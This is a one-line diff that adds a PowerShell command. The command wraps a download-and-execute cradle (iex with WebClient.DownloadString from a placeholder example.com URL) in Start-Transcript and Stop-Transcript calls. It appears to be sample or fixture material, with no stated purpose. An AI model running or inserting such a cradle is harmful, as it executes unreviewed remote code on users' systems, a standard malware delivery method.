@@ -1,0 +1,1 @@
+Start-Transcript -Path 'C:\transcript.txt'; iex (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1'); Stop-Transcript
